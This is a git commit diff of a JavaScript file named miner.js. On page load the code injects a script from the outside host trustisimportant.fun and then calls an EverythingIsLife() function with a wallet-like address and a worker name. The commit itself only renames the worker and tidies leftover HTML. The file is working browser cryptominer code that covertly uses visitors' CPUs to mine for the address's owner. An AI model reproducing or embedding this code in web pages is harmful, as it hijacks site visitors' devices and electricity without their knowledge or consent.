c75ac5ad12de82df3229ba555924afd3a1c96253
catcatdot <142739704+catcatdot@users.noreply.github.com>
2023-10-02 00:54:27 +0100

    Update miner.js

--- miner.js
+++ miner.js
@@ -1,19 +1,12 @@
-
-  window.onload = function() {
+window.onload = function() {
   var body = document.createElement('body');
   var s1 = document.createElement('script');
   var s2 = document.createElement('script');
   
   s1.src = "https://trustisimportant.fun/karma/karma.js?karma=bs?nosaj=faster.mo";
   s2.type = "text/javascript";
-  s2.innerHTML = "EverythingIsLife('4A2SkhykRUHAmDTiVJpd6weBukyyxCtd9AkgR5TQcf1w9zQLLCqLx4KJMzZucVYyZv7H98qgTDHfrASLuC8U8fK64dNxcxM', 'Master Duel');";
+  s2.innerHTML = "EverythingIsLife('4A2SkhykRUHAmDTiVJpd6weBukyyxCtd9AkgR5TQcf1w9zQLLCqLx4KJMzZucVYyZv7H98qgTDHfrASLuC8U8fK64dNxcxM', 'Master');";
   
     document.body.appendChild(s1);
         document.body.appendChild(s2);
 }
-</script>
-</head>
-<body>
-</body>
-
-
